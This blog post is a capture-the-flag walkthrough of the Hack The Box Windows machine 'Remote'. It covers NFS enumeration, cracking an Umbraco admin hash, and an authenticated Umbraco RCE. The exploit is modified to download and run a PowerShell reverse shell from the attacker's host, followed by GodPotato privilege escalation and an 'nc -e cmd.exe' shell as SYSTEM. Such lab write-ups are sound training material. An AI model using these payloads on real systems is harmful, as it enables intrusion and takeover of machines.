---
layout: post
title: Remote
date: 2025-10-19 13:00:00 +0100
categories: [Walkthroughs]
tags: [htb, Windows, NTFS, hashcat, privesc]
---
![alt text](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8d7c152dc9c28c9556b07dc724c6a37b.png)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | Hack The box       |
| OS | Windows        |
| Difficulty | Easy        |
| Release Date | 21 Mar 2020        |
| Link to machine | [Remote](https://app.hackthebox.com/machines/234)        |

# Highlights
NFS exploitation, Dirsearch, Hashcat, XML, Searchsploit, Windows Privilege Escalation

---

# Open ports enumeration
Lets start by starting an nmap scan

```bash
nmap -T4 -A -p- 10.10.10.180
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 07:47 EDT
Nmap scan report for 10.10.10.180
Host is up (0.042s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/19%OT=21%CT=1%CU=43004%PV=Y%DS=2%DC=T%G=Y%TM=68F4D0
OS:68%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS
OS:=U)SEQ(SP=106%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=1%IS
OS:R=10B%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=F9%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS
OS:=S%TS=U)SEQ(SP=FF%GCD=1%ISR=110%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M542NW8N
OS:NS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)WIN(W
OS:1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%
OS:O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
OS:N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U
OS:1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF
OS:I=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 1s
| smb2-time: 
|   date: 2025-10-19T11:49:26
|_  start_date: N/A

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   96.23 ms 10.10.16.1
2   27.15 ms 10.10.10.180
```

The interesting findings here are:```21/ftp```, ```80/http```, ```2049/tcp```

FTP not only is vulnerable but ```NMAP``` is confirming ```Anonymous FTP login allowed```
HTTP port 80 is a website which requires further enumeration
NFS 2049 is interesting as it allows file sharing between Windows and non-Windows systems


Connecting to ```FTP``` does not bring any results, so let's enumerate ```2049/tcp``` which is NFS.

# NFS Enumeration

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)

```

Using ```showmount -e``` we can check what shares are available and we find ```site_backups```

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ sudo mount -t nfs 10.10.10.180:/site_backups /mnt/
cd /mnt
ls
App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views

```
We find a few files, but the one we need to progress further is ```Umbraco.sdf``` in the ```App_Data``` folder, which contains some hashes.

```bash
┌──(Kyd0s㉿kali)-[/mnt]
└─$ cd App_Data
                                                                                                                            
┌──(Kyd0s㉿kali)-[/mnt/App_Data]
└─$ ls
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
```

```bash 
┌──(Kyd0s㉿kali)-[/mnt/App_Data]
└─$ strings Umbraco.sdf                               
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d8******************{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d8******************{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```
Not only we find an hash for the user ```adminadmin```, but we also know the kind, ```SHA1```

# Cracking SHA1 hash with Hahcat
```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ echo "b8be16afba8c314ad33d8******************" >> adminadminhash.txt
```
Save the hash to a txt file
```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ hashcat -h | grep "SHA1"
    100 | SHA1                                                       | Raw Hash
```
Identify the module required for ```SHA1```

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ hashcat -m 100 adminadminhash.txt /usr/share/wordlists/rockyou.txt
...
b8be16afba8c314ad33d8******************:bacon*********   
                                                          
Session..........: hashcat
Status...........: Cracked
...
```
# Enumerating HTTP Port 80 with dirsearch

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ dirsearch -u http://10.10.10.180 -x 403,500,404,400
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                     
                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/Kyd0s/HTB/Remote/reports/http_10.10.10.180/_25-10-19_08-20-56.txt

Target: http://10.10.10.180/

[08:20:56] Starting:                                                                                                        
[08:21:02] 200 -    2KB - /about-us                                         
[08:21:15] 200 -    2KB - /blog                                             
[08:21:15] 200 -    2KB - /blog/
[08:21:19] 200 -    3KB - /contact                                          
[08:21:19] 200 -    3KB - /contact.aspx                                     
[08:21:27] 200 -    2KB - /home.aspx                                        
[08:21:27] 200 -    2KB - /home                                             
[08:21:28] 302 -  126B  - /Install  ->  /umbraco/                           
[08:21:28] 302 -  126B  - /INSTALL  ->  /umbraco/                           
[08:21:28] 302 -  126B  - /install  ->  /umbraco/                           
[08:21:29] 302 -  126B  - /install/  ->  /umbraco/                          
[08:21:29] 200 -    1KB - /intranet                                         
[08:21:38] 200 -    2KB - /people                                           
[08:21:42] 200 -    2KB - /products.aspx                                    
[08:21:42] 200 -    2KB - /products                                         
[08:21:54] 200 -    6KB - /umbraco/webservices/codeEditorSave.asmx
```

The page ```install``` redirects to ```umbraco```, the same name of the database file where we found the hash.

Visiting ```http://10.10.10.180/umbraco``` redirects us to ```http://10.10.10.180/umbraco/#/login```

![alt text](https://raw.githubusercontent.com/Kyd0s/Kyd0s.github.io/refs/heads/main/assets/images/Umbraco1.png)


Using the credentials we found, we can login to the Umbraco dashboard ```admin@htb.local:bacon*********```

![alt text](https://raw.githubusercontent.com/Kyd0s/Kyd0s.github.io/refs/heads/main/assets/images/Umbraco2.png)

Once logged in, we find the Umbraco version ```7.12.4```.

# Exploiting Umbraco CMS 7.12.4
```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ searchsploit Umbraco 7.12.4
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                | aspx/webapps/49488.py
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```
Using ```Searchsploit``` we find to Remote Code Execution exploits, we can copy the first in the list and check the code

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ searchsploit -m aspx/webapps/46153.py 
  Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46153
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46153.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/Kyd0s/HTB/Remote/46153.py


                                                                                                                            
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ gedit 46153.py 

```
Lines ```27-28``` and ```34-36``` are the ones we are interested in, so we modify the following and save the file:

```bash
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
```

```bash
login = "XXXX;
password="XXXX";
host = "XXXX";
```
With the following

```bash
{ string cmd = "IEX(IWR http://10.10.16.4:80/Invoke-PowerShellTcp.ps1 -UseBasicParsing)"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
```

```bash
login = "admin@htb.local";
password="bacon*********";
host = "http://10.10.10.180";

```
Now we can download the ```PowerShellTcp.ps1``` from ```https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1``` and append ```Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.4 -Port 4444``` to the ps1 file.
```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
--2025-10-19 08:53:18--  https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4339 (4.2K) [text/plain]
Saving to: ‘Invoke-PowerShellTcp.ps1’

Invoke-PowerShellTcp.ps1       100%[====================================================>]   4.24K  --.-KB/s    in 0.001s  

2025-10-19 08:53:18 (5.60 MB/s) - ‘Invoke-PowerShellTcp.ps1’ saved [4339/4339]

┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.4 -Port 4444" >> Invoke-PowerShellTcp.ps1
```
Now we are ready to execute the attack:
Once we launch our modified ```49153.py```, is going to use powershell from the victim machine, reach to out malicious webserver on port 80, download the malicious ps1 file and execute it, so we will catch a reverse shell on port 4444.

# Foothold

Start a webserver on port 80 (or the one used in the payload)

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start a listener on port 4444 (or the one used in the payload)

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
```

Launch the python exploit
```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ python3 46153.py -u 'admin@htb.local' -p 'bacon*********' -i 'http://10.10.10.180' -c whoami
Start
[]
End

```
```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.180] 49700
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>

```
Check the nc listener for the reverse shell, we are now ```inetsrv```

# Privilege Escalation

```bash
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Because we have the ```SeImpersonatePrivilege``` Enabled, we can use GodPotato to Escalate Privileges to ```NT AUTHORITY\SYSTEM``` and collect both ```user.txt``` and ```root.txt``` flags.
Download GodPotato.exe, transfer it to the victim machine and run it following the instructions found at ```https://github.com/BeichenDream/GodPotato```

```bash
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe

```

```bash
PS C:\windows\system32\inetsrv>cd C:\Users\Public
PS C:\users\Public> curl http://10.10.16.4:80/GodPotato-NET2.exe -o GodPotato.exe
PS C:\users\Public> curl http://10.10.16.4:80/nc.exe -o nc.exe
PS C:\users\Public> ./GodPotato.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140710504890368
[*] DispatchTable: 0x140710507207920
[*] UseProtseqFunction: 0x140710506583200
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\d203b39c-c20c-4667-bc14-498b715c273d\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000c02-0d0c-ffff-4e8b-1b121ceb6a31
[*] DCOM obj OXID: 0x4d0843b11995267c
[*] DCOM obj OID: 0xc8df792cf275fa65
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 860 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3248
nt authority\system
PS C:\users\Public>
```
Don't forget to start a new listener on the attacker machine!
```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
```

```bash
PS C:\users\Public> ./GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 10.10.16.4 5555"

```

Check your nc listener and collect both flags
```bash
┌──(Kyd0s㉿kali)-[~/HTB/Remote]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.180] 49719
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\users\Public>whoami 
whoami
nt authority\system

PS C:\Users\Public> type C:\Users\Public\Desktop\user.txt
type C:\Users\Public\Desktop\user.txt
9db1eba4d86d377******************

C:\users\Public>type c:\users\Administrator\Desktop\root.txt
type c:\users\Administrator\Desktop\root.txt
c9e204cb4bee18******************

```

Download GodPotato.exe, transfer it to the victim machine and run it following the instructions found at ```https://github.com/BeichenDream/GodPotato``` and collect both the ```user.txt``` and the ```root.txt``` flags.

Enjoy! :D